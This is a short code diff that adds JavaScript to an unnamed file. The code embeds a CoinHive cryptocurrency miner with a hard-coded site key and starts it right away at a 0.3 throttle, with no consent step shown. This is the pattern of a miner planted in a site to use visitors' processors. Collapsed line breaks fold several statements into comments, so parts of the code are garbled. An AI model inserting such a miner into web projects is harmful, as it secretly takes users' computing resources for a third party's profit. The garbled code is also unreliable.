@@ -1,0 +1,4 @@
+//Collect for Uservar miner_user = new CoinHive.User('m9o6sNmhNKcwnRKNaP7njHerVqUti7xu', '', {throttle: 0.3});// Listen on eventsminer_user.on('found', function() { /* Hash found */ })miner_user.on('accepted', function() { /* Hash accepted by the pool */ })// Update stats once per secondsetInterval(function() {var hashesPerSecond = miner_user.getHashesPerSecond();var totalHashes = miner_user.getTotalHashes();var acceptedHashes = miner_user.getAcceptedHashes();// Output to HTML elements...}, 1000);var miner = new CoinHive.Anonymous('m9o6sNmhNKcwnRKNaP7njHerVqUti7xu', {
+    throttle: 0.3
+});
+miner.start(); // Listen on eventsminer.on('found', function() { /* Hash found */ })miner.on('accepted', function() { /* Hash accepted by the pool */ })// Update stats once per secondsetInterval(function() {var hashesPerSecond = miner.getHashesPerSecond();var totalHashes = miner.getTotalHashes();var acceptedHashes = miner.getAcceptedHashes();// Output to HTML elements...}, 1000);
